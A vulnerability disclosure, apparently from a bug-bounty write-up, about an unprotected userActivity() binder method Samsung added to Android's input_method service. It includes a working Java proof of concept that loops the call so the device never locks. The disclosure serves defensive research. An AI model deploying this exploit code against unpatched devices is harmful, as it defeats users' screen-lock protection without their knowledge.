# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.10</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.02.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$230</td>
    </tr>
</table>

# Description

The system service `input_method` (`com.android.internal.view.IInputMethodManager`) was created in AOSP, but was patched in the Samsung Android Framework. Samsung added the `userActivity()` method that wasn't protected in any way. Internally, it called the `PowerManager.wakeUp()` method, which required the system permission `android.permission.DEVICE_POWER`. This meant that any third-party app installed on the same device could simulate user activity and prevent the device from locking up.

**Proof of Concept**

This code will cause the device to never be locked:
```java
static final int TRANSACTION_userActivity = 29;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    new Thread(() -> {
        try {
            IBinder binder = getService("input_method");
            while (true) {
                Parcel parcel = Parcel.obtain();
                parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
                parcel.writeLong(SystemClock.uptimeMillis());
                parcel.writeInt(0);
                parcel.writeInt(0);

                Parcel reply = Parcel.obtain();
                binder.transact(TRANSACTION_userActivity, parcel, reply, 0);
                reply.readException();

                Thread.sleep(100);
            }
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }).start();
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
